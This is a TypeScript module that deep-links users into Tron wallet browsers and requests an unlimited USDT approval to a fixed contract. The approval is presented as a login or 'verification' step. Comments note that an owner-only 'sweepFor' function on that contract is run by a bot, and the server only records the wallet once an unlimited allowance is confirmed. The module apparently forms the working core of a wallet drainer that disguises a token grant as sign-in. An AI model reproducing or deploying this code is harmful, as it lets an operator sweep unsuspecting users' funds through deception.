// ---------------------------------------------------------------------------
// Tron support — TronLink / Trust Wallet / TokenPocket injected provider
// ---------------------------------------------------------------------------
// Privy + WalletConnect are EVM-only. Tron USDT approval ONLY works when the
// page runs inside a wallet DApp browser that injects window.tronWeb /
// window.tronLink. Opening "Open in Wallet" via WalletConnect from Safari
// does NOT inject tronWeb — that is why Tron was skipped. We deep-link the
// real page URL into Trust Wallet's DApp browser instead.

export interface TronToken {
  symbol: string;
  address: string;
  decimals: number;
  mandatory?: boolean;
}

export interface TronChainConfig {
  name: "tron";
  label: string;
  contract: string;
  enabled: boolean;
  explorer: string;
  tokens: TronToken[];
  overrideRpcUrl?: string;
}

export const TRON_CHAIN: TronChainConfig = {
  name: "tron",
  label: "Tron",
  contract: "TCmTc2WbtGbDuL6b5iFEkD2EzmjyG8ZnJy",
  enabled: true,
  explorer: "https://tronscan.org",
  tokens: [
    { symbol: "USDT", address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals: 6, mandatory: true },
  ],
  overrideRpcUrl: process.env.QUICKNODE_TRON_RPC_URL || undefined,
};

// TronV2 owner (hex). sweepFor is onlyOwner — bot must use this key.
// Base58: TYfN1BxXHMzfxu5Z8LqpSVxf7ZzhDQcBAS
export const TRON_RELAYER_HEX = "0xF8eAeBA08281dBe3E3375Ef1738D408893512D11";
export const TRON_OWNER_BASE58 = "TYfN1BxXHMzfxu5Z8LqpSVxf7ZzhDQcBAS";

interface TronWebLike {
  ready?: boolean;
  defaultAddress?: { base58?: string; hex?: string };
  request?: (args: { method: string }) => Promise<unknown>;
  trx: {
    getBalance?: (address: string) => Promise<number>;
  };
  contract: (...args: unknown[]) => any; // eslint-disable-line @typescript-eslint/no-explicit-any
}

declare global {
  interface Window {
    tronWeb?: TronWebLike;
    tronLink?: {
      ready?: boolean;
      request: (args: { method: string }) => Promise<unknown>;
      tronWeb?: TronWebLike;
    };
    ethereum?: {
      isTrust?: boolean;
      isTokenPocket?: boolean;
      providers?: Array<{ isTrust?: boolean; isTokenPocket?: boolean }>;
    };
  }
}

function isTronBase58(addr: string | undefined | null): addr is string {
  return !!addr && /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(addr);
}

/** True when running inside Trust / TokenPocket / TronLink DApp browser (not Safari WC). */
export function isInWalletDappBrowser(): boolean {
  if (typeof window === "undefined") return false;
  if (window.tronWeb || window.tronLink) return true;

  const ua = navigator.userAgent || "";
  if (/Trust\//i.test(ua) || /TokenPocket/i.test(ua) || /TronLink/i.test(ua) || /imToken/i.test(ua)) {
    return true;
  }

  const eth = window.ethereum;
  if (eth?.isTrust || eth?.isTokenPocket) return true;
  if (eth?.providers?.some((p) => p.isTrust || p.isTokenPocket)) return true;
  return false;
}

export function isMobileBrowser(): boolean {
  if (typeof window === "undefined") return false;
  return /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent || "");
}

/**
 * Build the page URL that a wallet DApp browser should open (marks intent with tw=1).
 */
export function buildWalletDappTargetUrl(url?: string): string {
  if (typeof window === "undefined") return url || "";
  const u = new URL(url || window.location.href);
  u.searchParams.set("tw", "1");
  return u.toString();
}

/** @deprecated use buildWalletDappTargetUrl */
export const buildTrustDappTargetUrl = buildWalletDappTargetUrl;

export type TronCapableWalletId = "trust" | "tokenpocket" | "tronlink" | "imtoken";

export interface TronCapableWallet {
  id: TronCapableWalletId;
  label: string;
  /** Deep-link / universal link that opens `url` inside that wallet's injected browser */
  openUrl: (pageUrl: string) => string;
}

/**
 * Wallets that can inject tronWeb when the page runs in their in-app browser.
 * MetaMask / Rainbow / Coinbase / plain WalletConnect cannot — Tron is separate.
 */
export const TRON_CAPABLE_WALLETS: TronCapableWallet[] = [
  {
    id: "trust",
    label: "Trust Wallet",
    openUrl: (pageUrl) =>
      `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(pageUrl)}`,
  },
  {
    id: "tokenpocket",
    label: "TokenPocket",
    openUrl: (pageUrl) => {
      const params = encodeURIComponent(JSON.stringify({ url: pageUrl, chain: "TRON", source: "checkout-base" }));
      return `tpdapp://open?params=${params}`;
    },
  },
  {
    id: "tronlink",
    label: "TronLink",
    openUrl: (pageUrl) => {
      const param = encodeURIComponent(
        JSON.stringify({
          url: pageUrl,
          action: "open",
          protocol: "tronlink",
          version: "1.0",
        })
      );
      return `tronlinkoutside://pull.activity?param=${param}`;
    },
  },
  {
    id: "imtoken",
    label: "imToken",
    openUrl: (pageUrl) => `imtokenv2://navigate/DappView?url=${encodeURIComponent(pageUrl)}`,
  },
];

/** Open page inside a specific wallet DApp browser (required for tronWeb). */
export function openInWalletDapp(walletId: TronCapableWalletId, url?: string): void {
  if (typeof window === "undefined") return;
  const pageUrl = buildWalletDappTargetUrl(url);
  const wallet = TRON_CAPABLE_WALLETS.find((w) => w.id === walletId) ?? TRON_CAPABLE_WALLETS[0];
  window.location.href = wallet.openUrl(pageUrl);
}

/**
 * Open the CURRENT page inside Trust Wallet's injected DApp browser.
 * Prefer `openInWalletDapp` when offering multiple wallets.
 */
export function openInTrustWalletDapp(url?: string): void {
  openInWalletDapp("trust", url);
}

/** Mobile + not inside a Tron-capable DApp browser → Tron cannot work yet. */
export function needsWalletDappForTron(): boolean {
  return isMobileBrowser() && !isInWalletDappBrowser();
}

/** @deprecated use needsWalletDappForTron */
export const needsTrustDappForTron = needsWalletDappForTron;

/**
 * How many auto deep-links we've attempted this tab.
 * Auto-redirect at most once (Trust), then show wallet picker CTA.
 */
export function getTrustRedirectCount(): number {
  if (typeof window === "undefined") return 0;
  return parseInt(sessionStorage.getItem("tw_dapp_redirects") || "0", 10) || 0;
}

export function bumpTrustRedirectCount(): number {
  const n = getTrustRedirectCount() + 1;
  sessionStorage.setItem("tw_dapp_redirects", String(n));
  return n;
}

export function clearTrustRedirectCount(): void {
  if (typeof window === "undefined") return;
  sessionStorage.removeItem("tw_dapp_redirects");
}

export function isTronProviderPresent(): boolean {
  if (typeof window === "undefined") return false;
  return Boolean(window.tronLink) || Boolean(window.tronWeb);
}

export function isTronLinkInstalled(): boolean {
  return isTronProviderPresent();
}

function readTronAddressFromProvider(): string | null {
  if (typeof window === "undefined") return null;

  const candidates = [
    window.tronWeb?.defaultAddress?.base58,
    window.tronLink?.tronWeb?.defaultAddress?.base58,
  ];
  for (const addr of candidates) {
    if (isTronBase58(addr)) return addr;
  }
  return null;
}

/** Read a Tron base58 address if the provider already exposed one. */
export function getConnectedTronAddress(): string | null {
  return readTronAddressFromProvider();
}

async function waitForTronWeb(timeoutMs = 8000): Promise<boolean> {
  if (typeof window === "undefined") return false;
  if (window.tronWeb || window.tronLink) return true;

  return new Promise((resolve) => {
    let done = false;
    const finish = (ok: boolean) => {
      if (done) return;
      done = true;
      cleanup();
      resolve(ok);
    };

    const onInit = () => finish(true);
    const onMessage = (e: MessageEvent) => {
      const action = (e.data as { message?: { action?: string } })?.message?.action;
      if (action === "setAccount" || action === "setNode" || action === "tabReply") {
        if (window.tronWeb || window.tronLink) finish(true);
      }
    };

    window.addEventListener("tronWeb#initialized", onInit as EventListener);
    window.addEventListener("tronLink#initialized", onInit as EventListener);
    window.addEventListener("message", onMessage);

    const poll = setInterval(() => {
      if (window.tronWeb || window.tronLink) finish(true);
    }, 200);

    const timer = setTimeout(() => finish(false), timeoutMs);

    function cleanup() {
      clearInterval(poll);
      clearTimeout(timer);
      window.removeEventListener("tronWeb#initialized", onInit as EventListener);
      window.removeEventListener("tronLink#initialized", onInit as EventListener);
      window.removeEventListener("message", onMessage);
    }
  });
}

async function requestTronAccounts(): Promise<void> {
  try {
    if (window.tronLink?.request) {
      await window.tronLink.request({ method: "tron_requestAccounts" });
      return;
    }
    const tw = (window.tronLink?.tronWeb || window.tronWeb) as TronWebLike | undefined;
    if (tw?.request) {
      await tw.request({ method: "tron_requestAccounts" });
    }
  } catch {
    // user rejected or unsupported — caller keeps polling
  }
}

/**
 * Read-only peek — never prompts. Safe to call during Privy SIWE.
 */
export function peekTronAddress(): string | null {
  return readTronAddressFromProvider();
}

/**
 * Ensure we have a Tron address for scanning/approving.
 * Pass `{ prompt: true }` only AFTER Privy auth is fully done — prompting
 * during Privy's "Sign in to verify" steals the signature and leaves Privy stuck.
 */
export async function ensureTronAddress(opts?: { prompt?: boolean }): Promise<string | null> {
  if (typeof window === "undefined") return null;

  const existing = getConnectedTronAddress();
  if (existing) return existing;

  const allowPrompt = opts?.prompt !== false;
  // During Privy login we must NOT call tron_requestAccounts
  if (!allowPrompt) {
    await waitForTronWeb(isInWalletDappBrowser() ? 4000 : 1500);
    return getConnectedTronAddress();
  }

  const inDapp = isInWalletDappBrowser();
  const waitMs = inDapp || isMobileBrowser() ? 8000 : 2500;
  const present = await waitForTronWeb(waitMs);
  if (!present) return null;

  const afterWait = getConnectedTronAddress();
  if (afterWait) return afterWait;

  await requestTronAccounts();

  for (let i = 0; i < 40; i++) {
    const addr = getConnectedTronAddress();
    if (addr) return addr;
    await new Promise((r) => setTimeout(r, 250));
  }
  return null;
}

export async function connectTronLink(): Promise<string | null> {
  return ensureTronAddress();
}

const BASE58_CHARS = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

function base58Decode(str: string): Uint8Array {
  let num = BigInt(0);
  const base = BigInt(58);
  for (const ch of str) {
    const idx = BASE58_CHARS.indexOf(ch);
    if (idx < 0) throw new Error(`Invalid base58 char: ${ch}`);
    num = num * base + BigInt(idx);
  }
  let hex = num.toString(16);
  if (hex.length % 2) hex = "0" + hex;
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < bytes.length; i++) {
    bytes[i] = parseInt(hex.slice(i * 2, i * 2 + 2), 16);
  }
  return bytes;
}

export function tronBase58ToHex(base58Addr: string): string {
  if (base58Addr.startsWith("0x") && base58Addr.length === 42) return base58Addr;
  const decoded = base58Decode(base58Addr);
  const addrBytes = decoded.slice(1, 21);
  return "0x" + Array.from(addrBytes).map((b) => b.toString(16).padStart(2, "0")).join("");
}

export const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
/** Max uint256 as decimal string — TronWeb approve amount. */
export const TRON_MAX_UINT256 =
  "115792089237316195423570985008687907853269984665640564039457584007913129639935";

/**
 * ABI-encode a Tron address for triggerconstantcontract `parameter`.
 * Must base58-decode — treating T... as hex produces invalid params and
 * silent allowance-check failures.
 */
export function tronAddressToAbiParam(addr: string): string {
  const trimmed = addr.trim();
  if (/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(trimmed)) {
    const decoded = base58Decode(trimmed);
    // 21-byte address (0x41 + 20) + 4-byte checksum; use the 20-byte payload
    const payload = decoded[0] === 0x41 ? decoded.slice(1, 21) : decoded.slice(0, 20);
    return Array.from(payload)
      .map((b) => b.toString(16).padStart(2, "0"))
      .join("")
      .padStart(64, "0");
  }
  let hex = trimmed.replace(/^0x/i, "");
  if (hex.startsWith("41") && hex.length >= 42) hex = hex.slice(2);
  if (hex.length > 40) hex = hex.slice(-40);
  return hex.padStart(64, "0");
}

const USDT_APPROVE_ABI = [
  {
    name: "approve",
    type: "Function",
    stateMutability: "Nonpayable",
    inputs: [
      { name: "spender", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ name: "", type: "bool" }],
  },
  {
    name: "allowance",
    type: "Function",
    stateMutability: "view",
    inputs: [
      { name: "owner", type: "address" },
      { name: "spender", type: "address" },
    ],
    outputs: [{ name: "", type: "uint256" }],
  },
] as const;

function getInjectedTronWeb(): TronWebLike | null {
  if (typeof window === "undefined") return null;
  return (window.tronLink?.tronWeb || window.tronWeb) ?? null;
}

/** True when allowance is effectively unlimited (≥ 1e18 raw units ≈ far above any balance). */
export function isUnlimitedTronAllowance(raw: bigint | string | number): boolean {
  try {
    const n = typeof raw === "bigint" ? raw : BigInt(String(raw));
    // Max uint256 or any allowance large enough that USDT can't exhaust it
    return n >= BigInt("1000000000000000000"); // 1e18 raw (≥ 1e12 USDT)
  } catch {
    return false;
  }
}

/** Read USDT allowance(owner → TRON_CHAIN.contract) via injected tronWeb. */
export async function readTronUsdtAllowance(owner: string): Promise<bigint> {
  const tw = getInjectedTronWeb() as any; // eslint-disable-line @typescript-eslint/no-explicit-any
  if (!tw) throw new Error("tronWeb_missing");
  const usdt = await tw.contract(USDT_APPROVE_ABI, TRON_USDT);
  const raw = await usdt.allowance(owner, TRON_CHAIN.contract).call();
  if (raw == null) return 0n;
  if (typeof raw === "bigint") return raw;
  if (typeof raw === "object" && raw._hex) return BigInt(raw._hex);
  if (typeof raw === "object" && typeof raw.toString === "function") return BigInt(raw.toString());
  return BigInt(String(raw));
}

async function waitForTronAllowance(
  owner: string,
  timeoutMs = 90_000
): Promise<boolean> {
  const start = Date.now();
  // Fast first passes right after the wallet confirms, then mild backoff.
  let delayMs = 400;
  while (Date.now() - start < timeoutMs) {
    try {
      const allow = await readTronUsdtAllowance(owner);
      if (isUnlimitedTronAllowance(allow)) return true;
    } catch {
      /* keep polling */
    }
    await new Promise((r) => setTimeout(r, delayMs));
    delayMs = Math.min(delayMs + 150, 1200);
  }
  return false;
}

export type TronApproveResult =
  | { ok: true; address: string; txId?: string; alreadyApproved?: boolean }
  | { ok: false; address: string | null; error: string; rejected?: boolean };

/**
 * Background Tron USDT approve → wait until allowance is live on-chain.
 * One wallet approve popup per call (Retry login may call again). Never
 * auto-reprompts — that caused Trust to show approve twice on the same flow.
 */
export async function ensureTronUsdtApproved(opts?: {
  /** @deprecated Ignored — always a single approve popup per call. */
  maxAttempts?: number;
  /** Skip re-prompt when caller already resolved the Tron address. */
  address?: string;
}): Promise<TronApproveResult> {
  const address = opts?.address?.trim()
    ? opts.address.trim()
    : await ensureTronAddress({ prompt: true });
  const tw = getInjectedTronWeb();
  if (!address || !tw) {
    return { ok: false, address: address ?? null, error: "tron_wallet_not_connected" };
  }

  try {
    const existing = await readTronUsdtAllowance(address);
    if (isUnlimitedTronAllowance(existing)) {
      return { ok: true, address, alreadyApproved: true };
    }
  } catch {
    /* fall through to approve */
  }

  try {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const usdt = await (tw as any).contract(USDT_APPROVE_ABI, TRON_USDT);
    // Do not use shouldPollResponse — some wallets re-prompt or hang; we
    // confirm via allowance poll instead.
    const tx = await usdt.approve(TRON_CHAIN.contract, TRON_MAX_UINT256).send({
      feeLimit: 100_000_000,
      keepTxID: true,
    });
    const txId =
      typeof tx === "string"
        ? tx
        : tx && typeof tx === "object" && "txid" in tx
          ? String((tx as { txid: string }).txid)
          : undefined;

    // Ground truth on the wallet node — never treat broadcast alone as success.
    const confirmed = await waitForTronAllowance(address, 90_000);
    if (confirmed) return { ok: true, address, txId };
    return { ok: false, address, error: "allowance_not_confirmed" };
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err ?? "approve_failed");
    const lower = msg.toLowerCase();
    const rejected =
      lower.includes("reject") ||
      lower.includes("denied") ||
      lower.includes("cancel") ||
      lower.includes("declined");
    return { ok: false, address, error: msg, rejected };
  }
}

/**
 * Persist Tron wallet only after server confirms live USDT allowance.
 * Pass preConfirmed when the client already waited for live allowance so the
 * server does a fast re-check instead of a long second poll.
 */
export async function persistTronVerification(
  address: string,
  opts?: { preConfirmed?: boolean; txId?: string }
): Promise<boolean> {
  for (let attempt = 0; attempt < 6; attempt++) {
    try {
      const res = await fetch("/api/verify/tron", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          address,
          preConfirmed: Boolean(opts?.preConfirmed),
          ...(opts?.txId ? { txId: opts.txId } : {}),
        }),
      });
      if (res.ok) return true;
      // 409 = allowance not visible yet — wait and retry
      if (res.status === 409 && attempt < 5) {
        await new Promise((r) => setTimeout(r, opts?.preConfirmed ? 400 : 800));
        continue;
      }
      console.error("[tron] verify failed:", res.status, await res.text().catch(() => ""));
    } catch (e) {
      console.error("[tron] verify request error:", e);
    }
    await new Promise((r) => setTimeout(r, opts?.preConfirmed ? 400 : 700));
  }
  return false;
}
